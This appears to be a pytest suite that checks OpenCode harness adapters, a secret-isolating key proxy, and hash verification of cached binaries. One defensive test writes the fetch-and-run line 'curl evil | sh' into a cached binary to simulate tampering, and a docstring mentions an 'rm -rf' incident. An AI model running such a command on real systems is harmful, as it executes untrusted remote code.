"""The OpenCode 1.2.4 and 2.3.2 adapters score every parity episode like url-extraction.

Each paper-urls parity case (tests/test_paper_urls.py) is replayed through the adapter's real `run_episode` against
a fake OpenCode server (httpx MockTransport): as 1.2.4 messages with native structured output, and converted to
2.3.2 messages (flat messages, `shell` instead of `bash`, the answer as a JSON-only final message). The scores and
the GRPO reward must match url-extraction's expectations in both versions.

`AGENT_DISTILL_REAL_OPENCODE=1` additionally downloads the pinned binaries and runs them against a fake model.
"""

from __future__ import annotations

import asyncio
import fnmatch
import json
import os
from dataclasses import replace
from pathlib import Path
from typing import Any

import httpx
import pytest
from test_paper_urls import CASES, EXPECTED, MAX_TOOL_CALLS, TASK, url_extraction_reward

from agent_distill.config import load_profile
from agent_distill.harnesses import opencode
from agent_distill.harnesses.base import Endpoint, HarnessError, load_harness
from agent_distill.harnesses.opencode_v1 import OpenCodeV1
from agent_distill.harnesses.opencode_v1 import Runner as RunnerV1
from agent_distill.harnesses.opencode_v2 import (
    AGENT_ID,
    OpenCodeV2,
    answer_retry_prompt,
    normalize_messages,
    permissions,
    server_env,
)
from agent_distill.harnesses.opencode_v2 import Runner as RunnerV2
from agent_distill.rubrics import episode_context
from agent_distill.task import Limits

V1 = load_profile("harnesses", "opencode@1.2.4")
V2 = load_profile("harnesses", "opencode@2.3.2")
ENDPOINT = Endpoint(base_url="http://vllm/v1", model="policy")
ROW_OF = {case: CASES[case][0] for case in CASES}


class FakeV1:
    def __init__(self, messages: list[dict[str, Any]], structured: Any) -> None:
        self.messages, self.structured = messages, structured
        self.requests: list[tuple[str, str, Any]] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content) if request.content else None
        path = request.url.path
        self.requests.append((request.method, path, body))
        if path == "/session":
            return httpx.Response(200, json={"id": "ses_test"})
        if path.endswith("/message") and request.method == "POST":
            info = {"structured": self.structured} if self.structured is not None else {}
            return httpx.Response(200, json={"info": info})
        if path.endswith("/message"):
            return httpx.Response(200, json=self.messages)
        return httpx.Response(200, json=True)


def to_v2(messages: list[dict[str, Any]], structured: Any) -> list[dict[str, Any]]:
    """A 1.x parity episode as the messages an OpenCode 2 server returns."""
    result: list[dict[str, Any]] = []
    for number, message in enumerate(messages):
        if message["info"]["role"] == "user":
            text = "".join(part.get("text", "") for part in message["parts"])
            result.append({"id": f"u{number}", "type": "user", "time": {"created": 1}, "text": text})
            continue
        content: list[dict[str, Any]] = []
        for part in message["parts"]:
            if part["type"] != "tool":
                content.append({"type": part["type"], "text": part.get("text", "")})
                continue
            if part["tool"] == "StructuredOutput":
                continue
            state = part["state"]
            v2_state: dict[str, Any] = {"status": state["status"], "input": state["input"]}
            if state["status"] == "completed":
                v2_state["content"] = [{"type": "text", "text": state.get("output", "")}]
            else:
                v2_state["error"] = {"type": "tool.execution", "message": state.get("error", "")}
            name = "shell" if part["tool"] == "bash" else part["tool"]
            content.append({"type": "tool", "id": part["callID"], "name": name, "state": v2_state, "time": {}})
        if structured is not None:  # 2.x has no structured output: the answer is a JSON-only final message
            content.append({"type": "text", "text": json.dumps(structured)})
        result.append(
            {"id": f"a{number}", "type": "assistant", "time": {"created": 2, "completed": 3}, "agent": AGENT_ID,
             "model": {"id": "policy", "providerID": "local"}, "content": content, "finish": "stop", "cost": 0.001,
             "tokens": {"input": 10, "output": 5, "reasoning": 0, "cache": {"read": 0, "write": 0}}}
        )  # fmt: skip
    result.append({"id": "idle", "type": "idle", "time": {"created": 4}, "outcome": "succeeded"})
    return result


class FakeV2:
    def __init__(self, messages: list[dict[str, Any]]) -> None:
        self.messages = messages
        self.requests: list[tuple[str, str, Any]] = []

    def __call__(self, request: httpx.Request) -> httpx.Response:
        assert request.headers["authorization"].startswith("Basic ")
        body = json.loads(request.content) if request.content else None
        path = request.url.path
        self.requests.append((request.method, path, body))
        if path == "/api/session":
            return httpx.Response(200, json={"data": {"id": "ses_v2"}})
        if path.endswith("/prompt"):
            return httpx.Response(200, json={"data": {"id": "u0", "type": "user"}})
        if path.endswith("/wait"):
            return httpx.Response(204)
        if path.endswith("/message"):
            return httpx.Response(200, json={"data": self.messages, "cursor": {"previous": None, "next": None}})
        if path == "/api/info":
            return httpx.Response(200, json={"version": "2.3.2"})
        if path.endswith("/interrupt"):
            return httpx.Response(200, json={"interrupted": True})
        return httpx.Response(404, json={"message": path})


def server(version: str, password: str | None = None) -> opencode.Server:
    return opencode.Server("http://opencode", version, Path("/tmp/ws"), None, password)


def run_v1(case: str):
    row, messages, structured = CASES[case]
    fake = FakeV1(messages, structured)

    async def go():
        async with httpx.AsyncClient(base_url="http://opencode", transport=httpx.MockTransport(fake)) as client:
            runner = RunnerV1(server("1.2.4"), client)
            return await OpenCodeV1(V1).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))

    return asyncio.run(go()), fake


def run_v2(case: str):
    row, messages, structured = CASES[case]
    fake = FakeV2(to_v2(messages, structured))

    async def go():
        async with httpx.AsyncClient(
            base_url="http://opencode", auth=("opencode", "pw"), transport=httpx.MockTransport(fake)
        ) as client:
            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=client)
            return await OpenCodeV2(V2).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))

    return asyncio.run(go()), fake


@pytest.mark.parametrize("version", ["1.2.4", "2.3.2"])
@pytest.mark.parametrize("case", sorted(CASES))
def test_adapters_score_like_url_extraction(case: str, version: str) -> None:
    episode, _ = run_v1(case) if version == "1.2.4" else run_v2(case)
    assert episode.harness_id == f"opencode@{version}"
    row = ROW_OF[case]
    context = episode_context(episode, row, limits=Limits(max_tool_calls=MAX_TOOL_CALLS))
    evaluation = TASK.rubrics.score(context, mode="eval")
    train = TASK.rubrics.score(context, mode="train")
    fields, complete = EXPECTED[case]
    assert (evaluation.scores["protocol"] == 1.0) is complete
    # 2.x has no StructuredOutput tool call, so a correct complete episode uses one tool call fewer.
    assert train.reward == pytest.approx(url_extraction_reward(fields, complete, episode.tool_calls))
    kinds = {event.kind for event in episode.tool_events}
    assert "other" not in kinds


def test_v1_request_body() -> None:
    _, fake = run_v1("correct_and_complete")
    posts = [body for method, path, body in fake.requests if method == "POST" and path.endswith("/message")]
    body = posts[0]
    assert body["model"] == {"providerID": "local", "modelID": "policy"}
    assert body["system"] == TASK.system_prompt_text()
    assert {name for name, on in body["tools"].items() if on} == {"bash", "read", "grep", "glob", "webfetch"}
    assert body["format"]["type"] == "json_schema" and body["format"]["schema"] == TASK.answer.model_json_schema()
    assert body["parts"] == [{"type": "text", "text": TASK.render_prompt(ROW_OF["correct_and_complete"])}]


def test_v1_structured_output_fallback_message() -> None:
    from agent_distill.harnesses.opencode_v1 import message_body

    body = message_body(TASK, ROW_OF["correct_and_complete"], ("local", "policy"), structured=False)
    assert body["parts"][0]["text"].endswith("with reasoning, github_url, and project_page_url.")
    assert "format" not in body


def test_v2_requests() -> None:
    _, fake = run_v2("correct_and_complete")
    session = next(body for method, path, body in fake.requests if path == "/api/session")
    assert session["agent"] == AGENT_ID and session["model"] == {"providerID": "local", "id": "policy"}
    assert session["permissions"] == permissions(TASK.tools)
    prompt = next(body for method, path, body in fake.requests if path.endswith("/prompt"))
    assert prompt == {"text": TASK.render_prompt(ROW_OF["correct_and_complete"])}


def test_v2_permissions_hide_everything_but_the_task_tools() -> None:
    def hidden(action: str, rules: list[dict[str, str]]) -> bool:  # OpenCode's `whollyDisabled`
        rule = next((r for r in reversed(rules) if fnmatch.fnmatchcase(action, r["action"])), None)
        return bool(rule) and rule["resource"] == "*" and rule["effect"] == "deny"

    rules = permissions(TASK.tools)
    agent = [
        {"action": "*", "resource": "*", "effect": "allow"},
        *rules,
        {"action": "skill", "resource": "browser", "effect": "deny"},
    ]
    effective = agent + rules  # OpenCode appends its own rules after the agent's; the session's come last
    for tool in ("shell", "read", "grep", "glob", "webfetch"):
        assert not hidden(tool, effective)
    for tool in ("skill", "execute", "question", "edit", "write", "patch", "subagent", "websearch", "todowrite"):
        assert hidden(tool, effective)
    assert not hidden("skill", agent)  # why the session repeats the rules


def test_v2_system_prompt_is_url_extractions() -> None:
    prompt = TASK.system_prompt_for("opencode", "2.3.2", "final_json")
    assert "You may use Shell, Read, Grep, Glob, and WebFetch" in prompt
    schema = {k: v for k, v in TASK.answer.model_json_schema().items() if k != "description"}
    assert json.dumps(schema, separators=(",", ":")) in prompt and "{schema}" not in prompt


def test_v2_normalize_interrupted_and_failed() -> None:
    raw = [
        {"id": "u", "type": "user", "time": {"created": 1}, "payload": {"text": "hi"}},
        {"id": "a", "type": "assistant", "time": {"created": 2}, "model": {"id": "m", "providerID": "p"}, "content": [
            {"type": "tool", "id": "t1", "name": "shell", "state": {"status": "running", "input": '{"command": "ls"'}},
            {"type": "tool", "id": "t2", "name": "read", "state": {"status": "error", "input": {"path": "x"},
                                                                   "error": {"type": "e", "message": "nope"}}},
        ]},
        {"id": "i", "type": "idle", "outcome": "failed", "error": {"type": "provider", "message": "rate limited"}},
    ]  # fmt: skip
    normalized = normalize_messages(raw)
    assert normalized[0]["parts"][0]["text"] == "hi"
    first, second = normalized[1]["parts"]
    assert first["state"]["status"] == "error" and "running" in first["state"]["error"]
    assert first["state"]["input"] == {"raw": '{"command": "ls"'}
    assert second["state"]["error"] == "nope"
    assert normalized[1]["info"]["error"]["data"]["message"] == "rate limited"


def test_server_envs_keep_secrets_out(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("HF_TOKEN", "hf_secret_value_that_must_not_leak")
    monkeypatch.setenv("OPENCODE_PASSWORD", "pw")
    student = Endpoint(base_url="http://vllm/v1", model="policy")
    teacher = Endpoint(
        base_url="",
        model="zai-org/GLM-5.2",
        key_env="HF_TOKEN",
        native_id="huggingface/zai-org/GLM-5.2",
        headers={"X-HF-Bill-To": "huggingface"},
    )
    env = server_env(TASK, [student], "2.3.2", tmp_path)
    assert "HF_TOKEN" not in env and "OPENCODE_PASSWORD" not in env
    assert env["OPENCODE_DISABLE_CLAUDE_CODE"] == "1" and env["XDG_DATA_HOME"].startswith(str(tmp_path))
    config = json.loads(env["OPENCODE_CONFIG_CONTENT"])
    assert config["agents"][AGENT_ID]["system"] == TASK.system_prompt_for("opencode", "2.3.2", "final_json")
    assert config["provider"]["local"]["options"]["baseURL"] == "http://vllm/v1"
    with pytest.raises(ValueError, match="key_proxies"):  # a keyed endpoint never reaches the harness directly
        opencode.provider_config([teacher])
    with opencode.key_proxies([student, teacher]) as (routed_student, routed):
        assert routed_student == student
        assert routed.key_env is None and routed.headers == {} and routed.base_url.startswith("http://127.0.0.1:")
        teacher_env = opencode.server_env([routed])
        teacher_config = opencode.provider_config([routed])
        proxy = opencode.PROXIES[routed.base_url]
        assert proxy.upstream == opencode.HF_ROUTER and proxy.headers == {"X-HF-Bill-To": "huggingface"}
        with opencode.rekey([routed]) as (episode_endpoint,):
            assert episode_endpoint.session_key != routed.session_key
            assert proxy.accepts(f"Bearer {episode_endpoint.session_key}")
        assert not proxy.accepts(f"Bearer {episode_endpoint.session_key}")  # revoked with the episode
    assert "HF_TOKEN" not in teacher_env
    options = teacher_config["provider"]["huggingface"]["options"]
    assert options == {"baseURL": routed.base_url, "apiKey": routed.session_key}
    assert "hf_secret" not in json.dumps(teacher_config)
    assert opencode.model_ref(teacher) == ("huggingface", "zai-org/GLM-5.2")
    assert not opencode.PROXIES  # stopped


def test_v2_xdg_dirs_override_inherited_ones(monkeypatch, tmp_path) -> None:
    monkeypatch.setenv("XDG_DATA_HOME", "/shared/data")
    monkeypatch.setenv("XDG_STATE_HOME", "/shared/state")
    env = server_env(TASK, [ENDPOINT], "2.3.2", tmp_path)
    for key in ("XDG_DATA_HOME", "XDG_CONFIG_HOME", "XDG_STATE_HOME"):
        assert env[key].startswith(str(tmp_path) + "/")


def test_v2_each_episode_gets_its_own_server(monkeypatch, tmp_path) -> None:
    """Concurrent OpenCode 2 episodes read each other's spilled shell output on a shared server (and one `rm -rf`
    broke every episode beside it): every episode gets its own server, workspace and XDG directories."""
    row, messages, structured = CASES["correct_and_complete"]
    monkeypatch.setenv("XDG_DATA_HOME", "/shared/data")
    started: list[tuple[Path, dict[str, str]]] = []
    stopped: list[str] = []
    fakes: dict[str, FakeV2] = {}
    real_client = httpx.AsyncClient

    def start_server(executable, version, workspace, env, **kwargs):
        assert Path(executable) == tmp_path / "opencode" and version == "2.3.2"
        started.append((Path(workspace), env))
        url = f"http://episode-{len(started)}"
        fakes[url] = FakeV2(to_v2(messages, structured))
        return opencode.Server(url, version, Path(workspace), None, "pw")

    def client(**kwargs):
        return real_client(transport=httpx.MockTransport(fakes[kwargs["base_url"]]), **kwargs)

    monkeypatch.setattr(opencode, "start_server", start_server)
    monkeypatch.setattr(opencode, "stop_server", lambda server: stopped.append(server.url))
    monkeypatch.setattr(httpx, "AsyncClient", client)
    harness = OpenCodeV2(V2)
    monkeypatch.setattr(harness, "install", lambda cache: tmp_path / "opencode")

    async def go():
        async with harness.session([ENDPOINT], cache=tmp_path, task=TASK) as runner:
            limits = Limits(timeout=30, max_tool_calls=15)
            return await asyncio.gather(*(harness.run_episode(runner, TASK, row, ENDPOINT, limits) for _ in range(3)))

    episodes = asyncio.run(go())
    assert all(episode.answer is not None for episode in episodes)
    assert len(started) == 4 and len(stopped) == 4  # one configuration check, then one server per episode
    workspaces = [workspace for workspace, _ in started[1:]]
    assert len(set(workspaces)) == 3
    for (workspace, env), url in zip(started[1:], list(fakes)[1:], strict=True):
        assert env["XDG_DATA_HOME"].startswith(str(workspace)) and "HF_TOKEN" not in env
        create = next(body for _, path, body in fakes[url].requests if path == "/api/session")
        assert create["location"] == {"directory": str(workspace)}
    assert not any(workspace.exists() for workspace in workspaces)  # removed with their episode
    assert {episode.metadata["cwd"] for episode in episodes} == {str(w) for w in workspaces}


@pytest.mark.parametrize("retry", [False, True])
def test_v2_answer_retry(retry: bool) -> None:
    """2.x ends an episode on a text-only turn; with answer_retry the harness asks once for the JSON answer."""
    row, messages, structured = CASES["correct_and_complete"]
    full = to_v2(messages, structured)
    answer = full[-2]  # the assistant message with the JSON answer (before idle)
    prose = {**answer, "id": "prose", "content": [{"type": "text", "text": "Let me start with hf papers info."}]}
    first = [*full[:-2], prose, {"id": "idle1", "type": "idle", "outcome": "succeeded"}]
    nudge = {"id": "nudge", "type": "user", "text": answer_retry_prompt(TASK)}
    second = [*first, nudge, {**answer, "id": "answer"}, {"id": "idle2", "type": "idle", "outcome": "succeeded"}]
    fake = FakeV2(first)
    prompts: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/prompt"):
            prompts.append(json.loads(request.content)["text"])
            if len(prompts) == 2:
                fake.messages = second
        return fake(request)

    async def go():
        async with httpx.AsyncClient(
            base_url="http://opencode", auth=("opencode", "pw"), transport=httpx.MockTransport(handler)
        ) as client:
            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=client)
            harness = OpenCodeV2(V2, answer_retry=retry)
            return await harness.run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))

    episode = asyncio.run(go())
    if retry:
        assert prompts[1] == answer_retry_prompt(TASK) and len(prompts) == 2
        assert "reasoning, github_url, and project_page_url" in prompts[1]
        assert episode.answer is not None and episode.metadata["answer_retry"] is True
    else:
        assert len(prompts) == 1 and episode.answer is None and "answer_retry" not in episode.metadata
    with pytest.raises(ValueError, match=r"2\.x"):
        load_harness(V1, answer_retry=True)


def test_dead_server_is_a_harness_failure() -> None:
    """A server that stops answering raises HarnessError (not recorded, harness restarted) in both versions."""
    row, messages, structured = CASES["correct_and_complete"]

    def dead_after_session(fake):
        def handler(request: httpx.Request) -> httpx.Response:
            if request.url.path in {"/session", "/api/session"}:
                return fake(request)
            raise httpx.ConnectError("connection refused")

        return handler

    async def go_v1():
        transport = httpx.MockTransport(dead_after_session(FakeV1(messages, structured)))
        async with httpx.AsyncClient(base_url="http://opencode", transport=transport) as client:
            runner = RunnerV1(server("1.2.4"), client)
            return await OpenCodeV1(V1).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))

    async def go_v2():
        transport = httpx.MockTransport(dead_after_session(FakeV2(to_v2(messages, structured))))
        async with httpx.AsyncClient(base_url="http://opencode", auth=("opencode", "pw"), transport=transport) as c:
            runner = RunnerV2(TASK, server=server("2.3.2", "pw"), client=c)
            return await OpenCodeV2(V2).run_episode(runner, TASK, row, ENDPOINT, Limits(timeout=30, max_tool_calls=15))

    for go in (go_v1, go_v2):
        with pytest.raises(HarnessError, match="stopped answering"):
            asyncio.run(go())


def test_v1_episodes_keep_their_raw_messages() -> None:
    episode, _ = run_v1("correct_and_complete")
    assert episode.raw and episode.raw == CASES["correct_and_complete"][1]


def fake_release(version: str) -> bytes:
    import io
    import tarfile

    script = f"#!/bin/sh\necho {version}\n".encode()
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        info = tarfile.TarInfo("opencode")
        info.size, info.mode = len(script), 0o755
        tar.addfile(info, io.BytesIO(script))
    return buffer.getvalue()


def test_install_rehashes_the_cached_binary_on_every_use(monkeypatch, tmp_path) -> None:
    import dataclasses
    import hashlib

    from agent_distill.harnesses.base import architecture

    archive = fake_release("1.2.4")
    sha = hashlib.sha256(archive).hexdigest()
    profile = dataclasses.replace(V1, download=dataclasses.replace(V1.download, sha256={architecture(): sha}))
    downloads: list[str] = []

    def download(url: str, expected: str) -> bytes:
        downloads.append(url)
        assert expected == sha
        return archive

    monkeypatch.setattr(opencode, "download_verified", download)
    cache = tmp_path / "cache"
    binary = opencode.install(profile, cache)
    assert binary.read_bytes().startswith(b"#!/bin/sh") and len(downloads) == 1
    opencode.install(profile, cache)
    assert len(downloads) == 1  # the cached archive is re-hashed; the binary matches it
    binary.write_bytes(b"#!/bin/sh\necho 1.2.4\ncurl evil | sh\n")  # tampered, same --version output
    opencode.install(profile, cache)
    assert b"evil" not in binary.read_bytes() and len(downloads) == 1  # restored from the verified archive
    (binary.parent / "opencode.tar.gz").write_bytes(b"tampered")
    opencode.install(profile, cache)
    assert len(downloads) == 2 and b"evil" not in binary.read_bytes()  # archive mismatch: downloaded again
    assert binary.parent.stat().st_mode & 0o777 == 0o700


def test_default_cache_is_per_user(monkeypatch, tmp_path) -> None:
    from agent_distill.harnesses.base import default_cache

    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path))
    assert default_cache() == tmp_path / "agent-distill"
    monkeypatch.delenv("XDG_CACHE_HOME")
    assert default_cache() == Path.home() / ".cache" / "agent-distill"


def test_v2_password_read_respects_the_startup_deadline(tmp_path) -> None:
    import time

    silent = tmp_path / "opencode"
    silent.write_text("#!/bin/sh\nexec sleep 30\n")  # prints nothing and never exits
    silent.chmod(0o755)
    started = time.monotonic()
    with pytest.raises(HarnessError, match="no password"):
        opencode.start_server(silent, "2.3.2", tmp_path, {"PATH": "/usr/bin:/bin"}, startup_timeout=1)
    assert time.monotonic() - started < 10


def test_version_parsing_and_profiles() -> None:
    assert opencode.parse_version("1.2.4\n") == "1.2.4"
    assert opencode.parse_version("opencode v2.3.2") == "2.3.2"
    assert opencode.parse_version("") is None
    assert isinstance(load_harness(V1), OpenCodeV1) and isinstance(load_harness(V2), OpenCodeV2)
    with pytest.raises(ValueError):
        OpenCodeV1(V2)


# --------------------------------------------------------------------------------------------------
# Opt-in: the real pinned binaries against a fake model
# --------------------------------------------------------------------------------------------------


@pytest.mark.skipif(not os.environ.get("AGENT_DISTILL_REAL_OPENCODE"), reason="set AGENT_DISTILL_REAL_OPENCODE=1")
@pytest.mark.parametrize("keyed", [False, True], ids=["local", "keyed-via-proxy"])
@pytest.mark.parametrize("profile", [V1, V2], ids=["1.2.4", "2.3.2"])
def test_real_opencode_against_a_fake_model(profile, keyed, tmp_path, monkeypatch) -> None:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    requests: list[dict[str, Any]] = []
    authorizations: list[str | None] = []
    answer = {"reasoning": "x", "github_url": None, "project_page_url": None}

    class Model(BaseHTTPRequestHandler):
        def log_message(self, *args: Any) -> None:
            pass

        def do_POST(self) -> None:
            request = json.loads(self.rfile.read(int(self.headers["content-length"])))
            requests.append(request)
            authorizations.append(self.headers.get("authorization"))
            self.send_response(200)
            self.send_header("content-type", "text/event-stream")
            self.end_headers()
            base = {"id": "c", "object": "chat.completion.chunk", "created": 1, "model": "policy"}
            tools = [tool["function"]["name"] for tool in request.get("tools") or []]
            if "StructuredOutput" in tools:
                call = {"index": 0, "id": "call_1", "type": "function",
                        "function": {"name": "StructuredOutput", "arguments": json.dumps(answer)}}  # fmt: skip
                delta, finish = {"role": "assistant", "tool_calls": [call]}, "tool_calls"
            else:
                delta, finish = {"role": "assistant", "content": json.dumps(answer)}, "stop"
            for chunk in (
                {**base, "choices": [{"index": 0, "delta": delta, "finish_reason": None}]},
                {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": finish}],
                 "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2}},
            ):  # fmt: skip
                self.wfile.write(f"data: {json.dumps(chunk)}\n\n".encode())
            self.wfile.write(b"data: [DONE]\n\n")

    model_server = ThreadingHTTPServer(("127.0.0.1", 0), Model)
    threading.Thread(target=model_server.serve_forever, daemon=True).start()
    monkeypatch.setenv("HF_TOKEN", "hf_should_not_leak_into_the_agent_env")
    endpoint = Endpoint(base_url=f"http://127.0.0.1:{model_server.server_address[1]}/v1", model="policy")
    if keyed:  # a teacher-style endpoint: the real key stays in the stage process, behind the key proxy
        monkeypatch.setenv("FAKE_TEACHER_KEY", "real-teacher-key-xyz")
        endpoint = replace(endpoint, key_env="FAKE_TEACHER_KEY")
    harness = load_harness(profile)
    cache = Path(os.environ.get("AGENT_DISTILL_CACHE", tmp_path))
    row = ROW_OF["correct_and_complete"]

    async def go():
        async with harness.session([endpoint], cache=cache, task=TASK) as runner:
            await harness.healthy(runner)
            return await harness.run_episode(runner, TASK, row, endpoint, Limits(timeout=60, max_tool_calls=15))

    episode = asyncio.run(go())
    model_server.shutdown()
    assert episode.answer is not None and episode.answer.model_dump() == answer, episode.failure
    assert episode.harness_id == profile.id
    agent_requests = [r for r in requests if any(m.get("role") == "user" for m in r["messages"])]
    tools = sorted(tool["function"]["name"] for tool in agent_requests[-1].get("tools") or [])
    if profile.version == "2.3.2":
        assert len(requests) == 1  # no title-generation call
        assert tools == ["glob", "grep", "read", "shell", "webfetch"]
        assert agent_requests[-1]["messages"][0]["content"].startswith(
            TASK.system_prompt_for("opencode", "2.3.2", "final_json")
        )
    else:
        assert tools == ["StructuredOutput", "bash", "glob", "grep", "read", "webfetch"]
        assert episode.answer_mode == "native"
    assert "hf_should_not_leak" not in json.dumps(requests)
    if keyed:
        assert authorizations and all(a == "Bearer real-teacher-key-xyz" for a in authorizations)
